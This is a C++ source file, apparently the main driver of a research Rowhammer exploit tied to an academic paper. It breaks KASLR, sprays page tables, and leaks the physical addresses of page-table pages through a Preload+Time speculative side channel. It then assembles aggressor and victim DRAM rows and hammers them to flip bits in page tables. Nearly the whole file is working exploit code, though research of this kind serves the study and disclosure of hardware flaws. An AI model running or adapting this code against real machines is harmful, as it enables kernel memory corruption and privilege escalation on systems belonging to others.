#include "kaslr_break.h"
#include "preload_time.h"
#include "prlimit.h"
#include "contention.h"
#include "asm.h"
#include "gadget_base.h"
#include "evict.h"
#include "hammer.h"

// Some Globals:
std::vector<vaddr_t> vas; // Virtual addresses of all our sprayed user zero (i.e., PTEs - victims) pages. Indexed by aids.
std::vector<vaddr_t> user_vas; // Virtual addresses of all our sprayed user data pages (aggressors). Indexed by aids.
std::map<aid_t, physaddr_t> pte_pas; // Physical addresses of the PTEs of our sprayed user zero pages.
std::map<aid_t, physaddr_t> udata_pas; // Physical addresses of the user data pages.

int pte_file_fd; // File descriptor for shared memory file to allocate PTEs.

static bank_t target_bank = 0;

/*
 * PRELOAD_MUX: The number of addresses to be tested after having preloaded the guess in the cache. 
 * The theoretical bounds of this variable are [1, CACHE_WAYNESS] to avoid the tested addresses to 
 * evict the preloaded address from the cache. This still requires some testing as it seems to be 
 * more noisy than beneficial in shortening the time taken to leak the physical addresses. For a 
 * 'safe' value set it to 1 (default value).
 */
#ifndef PRELOAD_MUX
    #define PRELOAD_MUX 1 // TODO tweak
#endif

#define DEBUG_DO_PRELOAD_TIME

constexpr cfg_t cfg {
    .cheat_gadget_base = 0,
    .spray_ratio = 80,
    .evict_pte_cache = evict_l2_set,
    .cheat_preload_time = 0,
    .pte_user_ratio = 7
};

/* 
 * @param va: The virtual address to be checked.
 * @description: To make Preload+Time easier, we we want to make sure that we can evict every
 * page table level independently, and without interacting with the TLB eviction.
 */
static bool is_preloadable(vaddr_t va)
{
    std::set<set_t> s {
        va.pte_l1_set(),
        va.pmd_l1_set(),
        va.pud_l1_set(),
        va.pgd_l1_set(),
        DATA_LOAD_L1_SET,
        TLB_EVICTION_L1_SET
    };
    return s.size() == 5;
}

/*
 * @param user_mem: The vector of user data pages to be sprayed.
 * @param ptes: The vector of PTEs to be sprayed.
 * @param fd: The file descriptor for the shared memory file to allocate PTEs.
 * @description: The function sprays the page tables and user data pages. It first allocates a user
 * data page and then allocates 'n' PTE for each user data page. in the paper this refers to the 
 * interleaved memory spraying technqiue (Section 7.4). According to our experiments, on our 
 * testbed the best ratio of user data pages to PTEs is 1:7. This means that for every user data 
 * page, we allocate 7 PTEs.
 */

void spray_pte_user_mem(std::vector<vaddr_t>& user_mem, std::vector<vaddr_t>& ptes, int fd)
{
    uint64_t pte_i;
    uint8_t *p, *user_p;
    uint64_t addr, uaddr;
    vaddr_t udata, pte_addr;


    addr = 4ULL * GB;
    uaddr = addr + 50000ULL * GB;

    pte_addr.va = addr;
    udata.va = uaddr;

    step_start();
    pr_info("[!] Spraying page tables...\n");
    // Setup user buffer - we will fault in single pages in the spraying loop
    user_p = (uint8_t *) mmap((void *)uaddr, 100ULL * GB, DATA_PG_PROT, DATA_PG_MMAP_FLAGS, -1, 0);
    if(user_p == MAP_FAILED) {
        pr_err("Could not alloc user data page at addr %lx\n", addr);
        exit(EXIT_FAILURE);
    }
    assert(madvise(user_p, 100ULL * GB, MADV_NOHUGEPAGE) == 0);
    madvise(user_p, 100ULL * GB, MADV_UNMERGEABLE);
    
    // Spraying loop
    for(uint64_t i = 0; i < ((SYS_MEM) / (PAGE_SIZE + PAGE_SIZE)) * cfg.spray_ratio/100; ++i) {
        for(uint user_i = 0; user_i < VMA_FILE_FACTOR; ++user_i) {
            for(uint j = 0; j < PAGE_SIZE / sizeof(uint64_t); ++j) {
                *(((uint64_t *) user_p) + j) = hammering_pte_data_patt;
            }

            // Make sure the user data pages are not collapsed into a THP/Merged by KSM _and_ stay resident in memory
            madvise(user_p, PAGE_SIZE, MADV_NOHUGEPAGE);
            madvise(user_p, PAGE_SIZE, MADV_UNMERGEABLE);
            if(mlock(user_p, PAGE_SIZE)) {
                pr_err("mlock failed\n");
                perror("");
                goto out;
            }

            user_mem.push_back(user_p);
            udata.va += PAGE_SIZE;
            user_p = udata.get_ptr();
        }

        for(pte_i = 0; pte_i < cfg.pte_user_ratio; ++pte_i) {
            do{
                pte_addr.va += ALLOC_SIZE_VMA_MERGE;
            } while(is_preloadable(pte_addr));
            p = alloc_zero_page_fixed((void *)pte_addr.get_ptr(), fd);
            if(p == NULL) {
                goto out;
            }
            for(uint vma_i = 0; vma_i < VMA_FILE_FACTOR; ++vma_i) {
                ptes.push_back(p);
                p += (PAGE_SIZE * PTE_STRIDE);
                
            }
            pte_addr += ALLOC_SIZE_VMA_MERGE;
        }

        if(((i & 0xff) == 0) && mem_available() < 256ULL * MB) {
            pr_info("Available memory pages is only %lu. Let's stop here...\n", get_avphys_pages());
            goto out;
        }
    }
out:
    pr_info("[+] Done spraying page tables.\n");
    pr_info("Should correspont to %zu data pages (i.e., %llu GB) and %zu page tables (i.e. %llu GB)\n", user_mem.size(), (user_mem.size() * PAGE_SIZE) / GB, ptes.size()*513/512, ptes.size()*513/512 * 4*KB / GB);
    step_end();
}

static int aid_in_patterns(aid_t aid, std::vector<hamm_patt_t> pats)
{
    for (auto &pat : pats) {
        for (auto x : pat.first)
            if (aid == x)
                return 1;
    }
    return 0;
}

/* @param bank_to_patterns: The map of bank to patterns in order to filter out previously tested 
 * AIDs.
 * @description: Returns a vector of size `PRELOAD_MUX` (default = 1) AIDs with equal pte l2 sets.
 * Over multiple calls, it will never repeat AIDs.
 */

static std::vector<aid_t> find_congruent_aids(const std::map<bank_t, std::vector<hamm_patt_t>> &bank_to_patterns)
{
    static std::map<set_t, std::vector<aid_t> > buckets;
    static std::set<aid_t> visited;
    set_t set;
    aid_t v;

    if (buckets.empty())
        for (set_t s = 0; s < L2_SETS; s++)
            buckets.insert(std::make_pair(s, std::vector<aid_t>()));

    while (1) {
        do {
            v = rand() % vas.size();
        } while (visited.count(v) && aid_in_patterns(v, bank_to_patterns.at(target_bank)));
        visited.insert(v);
        set = find_pte_l2_set(vas.at(v));
        if (set == -1)
            continue;
        buckets.at(set).push_back(v);
        if (buckets.at(set).size() % PRELOAD_MUX == 0)
            break;
    }

    return std::vector<aid_t>(buckets.at(set).end() - PRELOAD_MUX, buckets.at(set).end());
}

/*
 * @param vs: The vector of virtual addresses to be tested.
 * @param pa_guess: The guessed physical address of the PTE.
 * @param times: The vector to store the times taken to access the addresses.
 * @description: This is the core function which does PRELOAD+TIME against the MMU's page table 
 * walk in order to leak the physical address of a PTE page for a given virtual address. (See 
 * Section 6.4 in the paper).
 */

static void do_do_preload_time_pte_mux(const std::vector<aid_t> vs, physaddr_t pa_guess, uint64_t *times)
{
    kva_t kva_guess = direct_map() + pa_guess;
    set_t l2set = l2_set(pa_guess);
    
    for (unsigned int i = 0; i < N_MEASUREMENTS; i++) {
        for (int j = 0; j < PRELOAD_MUX; j++)
            load(vas.at(vs[j]).get_ptr() + DATA_LOAD_L1_SET*CACHELINE_SZ);
        lfence();
        evict_tlb(vas.at(vs[0])); // All addresses have equal DTLB and STLB sets.
        lfence();
        cfg.evict_pte_cache(l2set);
        lfence();
        speculatively_load(kva_guess);
        for (int j = 0; j < PRELOAD_MUX; j++)
            times[i + j*N_MEASUREMENTS] = time_access((void *)(vas.at(vs[j]).va + DATA_LOAD_L1_SET*CACHELINE_SZ));
    }
}

#define HEUR_LOW 10
#define HEUR_HIGH 21
#define HEUR_ROUND2_N 20
#define HEUR_ROUND2_THRES ((HEUR_ROUND2_N * N_MEASUREMENTS)/500)

/*
 * @param vs: The vector of virtual addresses to be tested.
 * @param pa_guess: The guessed physical address of the PTE.
 * @description: This function essentially just calls the `do_do_preload_time_pte_mux` function. It 
 * is just an optimization to speed up the end-to-end exploit where we first check whether we get 
 * _any_ hits at all when preloading the pa_guess. If we do, we then check more carefully if we see 
 * a hit by means of more repetitions.
 * @return: The AID of the PTE that was found, or -1 if no PTE was found.
 */

static aid_t do_preload_time_pte_mux(const std::vector<aid_t> vs, physaddr_t pa_guess)
{
    uint64_t times[PRELOAD_MUX*N_MEASUREMENTS];
    int counts[PRELOAD_MUX];

    // Round 1: quickly look for potential hits.
    do_do_preload_time_pte_mux(vs, pa_guess, times);
    int j;
    for (j = 0; j < PRELOAD_MUX; j++) {
        counts[j] = count_between(times + j*N_MEASUREMENTS, N_MEASUREMENTS, HEUR_LOW, HEUR_HIGH);

#ifdef DEGUB_DO_PRELOAD_TIME
        physaddr_t pa_true = procfs_pte_pa(vas.at(vs[j]));
        if (counts[j] || pa_true == pa_guess) {
            if (pa_true == pa_guess) {
                pr_info("First Round PRE+TIME! This was the measurement at the CORRECT physical PTE address:\n");
                print_histogram_header(11);
            }
            pr_info("%s/%3d | ", counts[j] ? "HIT " : "miss", counts[j]);
            print_histogram(times + j*N_MEASUREMENTS, N_MEASUREMENTS);
        }
#endif

        if (counts[j])
            break;
    }

    if (j == PRELOAD_MUX)
        return -1;

    // Round 2: check more carefully if we see a hit.
    for (int i = 0; i < HEUR_ROUND2_N-1; i++) {
        do_do_preload_time_pte_mux(vs, pa_guess, times);
        for (j = 0; j < PRELOAD_MUX; j++)
            counts[j] += count_between(times + j*N_MEASUREMENTS, N_MEASUREMENTS, HEUR_LOW, HEUR_HIGH);
    }

#ifdef DEGUB_DO_PRELOAD_TIME
    for (j = 0; j < PRELOAD_MUX; j++)
        pr_info("Round 2 | counts[%d] = %d\n", j, counts[j]);
#endif

    for (j = 0; j < PRELOAD_MUX; j++)
        if (counts[j] >= HEUR_ROUND2_THRES)
            return vs[j];

    return -1;
}

/*
 * @param aids: The vector of AIDs to be tested.
 * @description: The function preloads the PTEs of the given AIDs and returns the first one that
 * is found. It uses the `do_preload_time_pte_mux` function to do so. The function also checks if 
 * the physical address of the PTE is in the same bank as the target bank. If not, it returns -1. 
 * In essence, given a valid (mapped) virtual address, this function will return the _physical_ 
 * address of the last level page table entry (PTE) of the virtual address.
 * @return: The AID of the PTE that was found, or -1 if no PTE was found.
 * @precondition: The AIDs must be congruent (i.e., they must have the same PTE L2 set).
 */

static aid_t preload_time_ptes(std::vector<aid_t> aids)
{
    // Check if we already know the physical address of one of the PTEs.
    for (int i = 0; i < PRELOAD_MUX; i++)
        if (pte_pas.count(aids[i]))
            return aids[i];

    if (cfg.cheat_preload_time) {
        physaddr_t pa = procfs_pte_pa(vas.at(aids[0]));
        pte_pas.insert(std::make_pair(aids[0], pa));
        if (bank(pa) != target_bank)
            return -1;
        return aids[0];
    }

    physaddr_t base = ALIGN(gadget_base_pa(), BITS_L2SETS+6);
    assert(base >= gadget_base_pa() && l2_set(base) == 0);
    set_t set = find_pte_l2_set(vas.at(aids[0]));
    if (set == -1) {
        pr_info("Couldn't find L2 Set\n");
        return -1;
    }

#ifdef DEGUB_DO_PRELOAD_TIME
    pr_info("preload_time_ptes([%d, ...])\n", aids.at(0));
    vaddr_t va = vas.at(aids.at(0));
    pr_info("vas[%d] = %lx\n", aids.at(0), va.va);
    pr_info("pa(pte(%lx)) = %lx  (i.e. %.2f GB)\n", va.va, procfs_pte_pa(va), procfs_pte_pa(va)/(float)GB);
    pr_info("base = %lx  (i.e. %.2f GB)\n", base, base/(float)GB);
    print_histogram_header(11);
#endif

    int count = 0;
    for (physaddr_t pa = base + (set << 6); pa < SYS_MEM; pa += 1 << (BITS_L2SETS+6)) {
        if (bank(pa) != target_bank)
            continue;
        count++;
        aid_t aid = do_preload_time_pte_mux(aids, pa);
        if (aid != -1) {
            pr_info("Preload+Time'd aid %8d:  %16lx --> %16lx  (%s)\n", aid, vas.at(aid).va, pa, pa == procfs_pte_pa(vas.at(aid)) ? "OK" : "ERROR!");
            pte_pas.insert(std::make_pair(aid, pa));
            return aid;
        }
        if ((pa - (set << 6)) % GB == 0)
            pr_info("preload_time_ptes | scanned up to %2lu GB | count = %d\n", pa >> 30, count);
    }

    return -1;
}

#ifdef DEGUB_DO_PRELOAD_TIME
static bool debug_found_va;
#endif

/*
 * @param va_guess: The guessed virtual address of the PTE.
 * @param pa: The known physical address of the PTE.
 * @description: The function preloads the PTE at the given virtual address (guessed) and checks if 
 * the physical address is indeed the one passed as a parameter. In essence, this function is an 
 * oracle that given a guessed va and a known PTE pa, it tells you whether pa is the address of the 
 * last-level page table page for va's translation.
 */

#define N_MEASUREMENTS_PTE 1000

static int do_preload_time_pte(vaddr_t va_guess, physaddr_t pa)
{
    uint64_t times[10*N_MEASUREMENTS_PTE];

    if (cfg.cheat_preload_time)
        return procfs_pte_pa(va_guess) == pa;

    set_t l2set = find_pte_l2_set(va_guess);
    if (l2set == -1)
        return 0;

    for (unsigned int i = 0; i < 10*N_MEASUREMENTS_PTE; i++) {
        load(va_guess.get_ptr() + DATA_LOAD_L1_SET*CACHELINE_SZ);
        lfence();
        evict_tlb(va_guess);
        lfence();
        evict_l2_set(l2set);
        lfence();
        speculatively_load(direct_map() + pa);
        times[i] = time_access((void *)(va_guess.va + DATA_LOAD_L1_SET*CACHELINE_SZ));
    }

    int count = count_between(times, 10*N_MEASUREMENTS_PTE, HEUR_LOW, HEUR_HIGH);

#ifdef DEGUB_DO_PRELOAD_TIME
    physaddr_t pa_true = procfs_pte_pa(va_guess);
    if (count || pa_true == pa || (rand() & 0x1f) == 0) {
        if (pa_true == pa) {
            debug_found_va = true;
            pr_info("Ahh Ten Choooooooooon! This was the measurement at the CORRECT virtual address:\n");
            print_histogram_header(11);
        }
        pr_info("%s/%3d | ", count >= 3 ? "HIT " : "miss", count);
        print_histogram(times, 10*N_MEASUREMENTS_PTE);
    }
#endif

    return count >= N_MEASUREMENTS_PTE/4;
}

/*
 * @param va: The virtual address of a user data page (i.e., aggressor).
 * @param pa: The guessed physical address of a user data page (i.e., aggressor).
 * @description: The function preloads the user data page at the given virtual address and checks 
 * if the physical address is indeed the one passed as a parameter. In essence, this function is an 
 * oracle that given a va and a pa, it tells you whether the va maps to the pa.
 */

#define N_MEASUREMENTS_UDATA 1000

int preload_time_data_page(vaddr_t va, physaddr_t pa)
{
    if (cfg.cheat_preload_time)
        return (pa >> 12) == (procfs_get_physaddr(va.get_ptr()) >> 12);

    int count = 0;
    for (unsigned int i = 0; i < N_MEASUREMENTS_UDATA; i++) {
        load((void *)(va.va));
        lfence();
        clflush((void *)(va.va));
        lfence();
        speculatively_load(direct_map() + pa);
        count += time_access((void *)(va.va)) < CACHE_THRES;
    }
#ifdef DEGUB_DO_PRELOAD_TIME
    if((procfs_get_physaddr(va.get_ptr()) >> PAGE_SHIFT) == (pa >> PAGE_SHIFT)) {
        debug_found_va = true;
        pr_info("true pa = %lx, pa = %lx count = %d %s\n", procfs_get_physaddr(va.get_ptr()), pa, count, procfs_get_physaddr(va.get_ptr()) == pa ? " (equal)" : "");
    }
    else {
        pr_info("guessed_pa = %lx, true_pa = %lx, count = %d %s\n", pa, procfs_get_physaddr(va.get_ptr()), count, procfs_get_physaddr(va.get_ptr()) == pa ? " (equal)" : "");
    }
#endif
    return count > N_MEASUREMENTS_UDATA/2;
}

/*
 * @param vic_aid: The AID of the PTE found earlier (i.e., one of the two victim pages forming a 
 * hammering triplet).
 * @param pa: The physical addresses of the PTEs and user data pages which form a hammering triplet.
 * @description: Contrary to the `preload_time_ptes` function, this function aims to find the 
 * virtual address of each _physical_ address forming a hammering triplet. We have already found 
 * one PTE in the physical address space, in order to form an effective hammering triplet we know 
 * the other pages (i.e., PTE page co-located in the victim row and the aggressor pages) MUST be at 
 * specific physical addresses to map to the desired DRAM addresses. Therefore, in this case we 
 * preload the physical addresses (pa[]) and check if we have the corresponding virtual addresses 
 * that map to those physical addresses.
 * @return: A pair of vectors containing the AIDs of the PTEs and user data pages that were found.
 */

static hamm_patt_t preload_time_vxxaxa(aid_t vic_aid, physaddr_t pa[6])
{
    constexpr aid_t RADIUS = 5; // Page Locality Optimization (Section 7.6): mates are usually allocated after each other (adjacent aids) - Let's still be a bit more conservative and check the AIDs at distance +- 5 for PTEs as we are only doing PRELOAD+TIME for one of the two PTEs.
    std::vector<aid_t> u_aids(4, -1), p_aids(2, -1);
    hamm_patt_t pat;
    physaddr_t phys_addr;
    physaddr_t u_pas[4], p_pas[2];

    p_pas[0] = pa[2];
    p_pas[1] = pa[3];
    u_pas[0] = pa[0];
    u_pas[1] = pa[1];
    u_pas[2] = pa[4];
    u_pas[3] = pa[5];

    for(int i = 0; i < 2; ++i) { //take care of the PTE PAS
        if(pte_pas.at(vic_aid) == p_pas[i]) {
            p_aids[i] = vic_aid;
            pr_info("preload_time_vxxaxa | p_aids[%d] = %u  (%s)\n", i, p_aids[i], procfs_get_pte(vas.at(p_aids[i]).get_ptr()) == direct_map()+p_pas[i] ? "OK" : "ERROR!");
            continue;
        }
        for (aid_t aid = std::max(0, vic_aid - RADIUS); aid < std::min(vic_aid + RADIUS, (aid_t)vas.size()-1); aid++) {
            phys_addr = p_pas[i] + (vas.at(aid).pte_l1_set() << 6);
            if (do_preload_time_pte(vas.at(aid), phys_addr)) {
                pte_pas.insert(std::make_pair(aid, phys_addr));
                p_aids[i] = aid;
                break;
            }
        }
#ifdef DEGUB_DO_PRELOAD_TIME
        pr_info("preload_time_vxxaxa | p_aids[%d] = %d  (%s)\n", i, p_aids[i], p_aids[i] == -1 ?
                                        (debug_found_va ? "false negative" : "not found - OK") :
                                        (procfs_get_pte(vas.at(p_aids[i]).get_ptr()) == direct_map()+phys_addr ? "found - OK" : "false positive"));
#endif
        if(p_aids[i] == -1){
            return std::make_pair(std::vector<aid_t>(), std::vector<aid_t>());
        }
    }

    debug_found_va = true;

    for(int i = 0; i < 4; ++i) {
        pr_info("Looking for the user data page number %d\n", i);
        for(aid_t aid = 0; aid < (aid_t) user_vas.size(); aid++) {
            phys_addr = u_pas[i];

            // Page Locality Optimization (Section 7.6): mates are usually allocated after each other (adjacent aids).
            if (i == 1 || i == 3) {
                int found = 0;
                for (int off = -1; off <= 1; off += 2) {
                    if (u_aids[i] + off < 0 || u_aids[i] + off >=  (int)user_vas.size())
                        continue;
                    if (preload_time_data_page(user_vas.at(u_aids[i]+off), phys_addr)) {
                        udata_pas.insert(std::make_pair(u_aids[i]+off, phys_addr));
                        u_aids[i] = u_aids[i]+off;
                        found = 1;
                        break;
                    }
                }
                if (found)
                    break;
            }

            if(preload_time_data_page(user_vas.at(aid), phys_addr)) {
                udata_pas.insert(std::make_pair(aid, phys_addr));
                u_aids[i] = aid;
                break;
            }  
        }
        pr_info("preload_time_vxxaxa | u_aids[%d] = %d (%s)\n", i, u_aids[i], u_aids[i] == -1 ?
                                        (debug_found_va ? "false negative" : "not found - OK") :
                                        (procfs_get_physaddr(user_vas.at(u_aids[i]).get_ptr()) >> 12 == phys_addr >> 12 ? "found - OK" : "false positive"));
        if(u_aids[i] == -1) {
            pr_info("No user data page preloaded that hit the pattern\n");
            return std::make_pair(std::vector<aid_t>(), std::vector<aid_t>());
        }
    }

    return std::make_pair(p_aids, u_aids);
}

static hamm_patt_t find_hammer_pattern(const std::map<bank_t, std::vector<hamm_patt_t>> &bank_to_patterns)
{
    std::vector<aid_t> aids, user_aids;
    hamm_patt_t pat;
    aid_t aid;
    physaddr_t pa[6];
    int success;
    static int counts[4] = {0};
    
    while (1) {
        pr_info("### find_congruent_aids\n");
        step_start();
        aids = find_congruent_aids(bank_to_patterns);
        counts[0]++;
        step_end();
        if (aids.empty())
            continue;

        pr_info("### preload_time_ptes\n");
        step_start();
        aid = preload_time_ptes(aids);
        counts[1]++;
        step_end();
        if (aid == -1)
            continue;

        pr_info("### compute_vxxaxa\n");
        step_start();
        success = compute_vxxaxa(pte_pas.at(aid), pa);
        counts[2]++;
        step_end();
        if(!success)
            continue;

        pr_info("### preload_time_vxxaxa\n");
        step_start();
        pat = preload_time_vxxaxa(aid, pa);
        counts[3]++;
        step_end();
        if(pat.second.empty())
            continue;
        
        pr_info("### DONE!\n");
        break;
    }

    pr_info("step counts: %d %d %d %d\n", counts[0], counts[1], counts[2], counts[3]);

    return pat;
}

void print_usable_pattern(hamm_patt_t &pat)
{
    physaddr_t pa;
    bool correct = true;
    
    pr_info("victim row:\n");
    for(const auto &aid: pat.first) {
        pa = pte_pas.at(aid);
        pr_info("aid %d | va %12lx --> pte_pa %9lx [bk %d, row %d] (%s)\n", aid, vas.at(aid).va, pa, bank(pa), row(pa), pa == procfs_pte_pa(vas.at(aid)) ? "correct" : "INCORRECT");
        if (pa != procfs_pte_pa(vas.at(aid)))
            correct = false;
    }
    pr_info("aggressor rows:\n");
    for(const auto &aid: pat.second) {
        pa = udata_pas.at(aid);
        pr_info("aid %d | va %12lx --> udata_pa %9lx [bk %d, row %d] (%s)\n", aid, user_vas.at(aid).va, pa, bank(pa), row(pa), pa == procfs_get_physaddr(user_vas.at(aid).get_ptr()) ? "correct" : "INCORRECT");
        if(pa != procfs_get_physaddr(user_vas.at(aid).get_ptr())) {
            correct = false;
        }
    }

    pr_info("Hammering pattern: %s\n", correct ? "correct" : "INCORRECT");
}

void print_pattern(std::vector<aid_t> aids)
{
    bool correct = true;
    for (const aid_t aid : aids) {
        physaddr_t pa = pte_pas.at(aid);
        pr_info("aid %d | va %12lx --> pte_pa %9lx [bk %d, row %d] (%s)\n", aid, vas.at(aid).va, pa, bank(pa), row(pa), pa == procfs_pte_pa(vas.at(aid)) ? "correct" : "INCORRECT");
        if (pa != procfs_pte_pa(vas.at(aid)))
            correct = false;
    }
    pr_info("Hammering pattern: %s\n", correct ? "correct" : "INCORRECT");
}

void print_bk_to_patts(std::map<bank_t, std::vector<hamm_patt_t>>& bk_to_patts)
{
    // for(bank_t bk = 0; bk < N_BANKS; ++bk) {
    //     pr_info("bk %-2u has %zu patts\n", bk, bk_to_patts.at(bk).size());
    // }
    pr_info("Found %lu pattens in bank %d so far.\n|\n|\n", bk_to_patts.at(target_bank).size(), target_bank);
    pr_info("=========================================================================================================================\n");
}

int main(int argc, char **argv)
{
    uint64_t tlb_thresh;
    std::map<bank_t, std::vector<hamm_patt_t>> bank_to_patterns;
    int flipped = 0;
    hamm_patt_t pat;
    std::vector<std::vector<int>> combinations;
    std::vector<hamm_patt_t> nails;
    int bk_cnt;

    if(argc > 1) {
        pr_err("No arguments required for now... Run with %s\n", argv[0]);
        return -1;
    }

    if(geteuid() == 0) {
       pr_err("[!] You are running as root user; this will give noise...\n");
       return -1;
    }

    set_cpu_affinity(CPU);
    tlb_thresh = get_tlb_hit_threshold();
    kaslr_break(tlb_thresh);
    contention_init();
    pte_file_fd = open("/dev/shm/pte_file", O_CREAT | O_RDWR, 0666);
    assert(pte_file_fd > 0);
    assert(ftruncate(pte_file_fd, ALLOC_SIZE_VMA_MERGE) == 0);
    prefetch_gadget_base(tlb_thresh);

    do_prlimit_init();

    spray_pte_user_mem(user_vas, vas, pte_file_fd);

    for(bank_t bk = 0; bk < N_BANKS; ++bk) {
        bank_to_patterns.insert(std::make_pair(bk, std::vector<hamm_patt_t>()));
    }

    std::vector<hamm_patt_t> min_dist_patt_subset;
    bk_cnt = PATT_LEN * PATT_LEN;
    while(!flipped) {
        pat = find_hammer_pattern(bank_to_patterns);
        print_usable_pattern(pat);
        bank_t bk = bank(pte_pas.at(pat.first.at(0)));
        bank_to_patterns.at(bk).push_back(pat);
        print_bk_to_patts(bank_to_patterns);
        for(const auto &[bank, patts] : bank_to_patterns) {
            if(patts.size() >= PATT_LEN / 2) {
                std::vector<hamm_patt_t> patt_subset(patts.end() - PATT_LEN / 2, patts.end());
                step_start();
                flipped = hammer(patt_subset);
		        pr_info("Testing minimal distance pattern\n");
		        patt_subset = get_min_dist_patt(bank, bank_to_patterns);
                if((patt_subset.size() % (PATT_LEN / 2)) == 0) {
                    for(uint i = 0; i < patt_subset.size(); ++i) {
                        min_dist_patt_subset.push_back(patt_subset.at(i));
                        if(((i + 1) % (PATT_LEN / 2)) == 0) {
                            flipped |= hammer(min_dist_patt_subset);
                            min_dist_patt_subset.clear();
                        }
                    }
                }
                
		        step_end();
                if(flipped) {
                    break;
                }

                patt_subset.clear();
            }
        }
        if(bank_to_patterns.at(target_bank).size() >= bk_cnt) {
            target_bank++;
            if(target_bank >= N_BANKS) {
                for(auto& [bk, patts] : bank_to_patterns) {
                    patts.clear();
                }
                target_bank = 0; //Lets' cycle over again but let's be less optimistic on number of patts
                bk_cnt -= 20;
            }
        }
    }

    return 0;
}
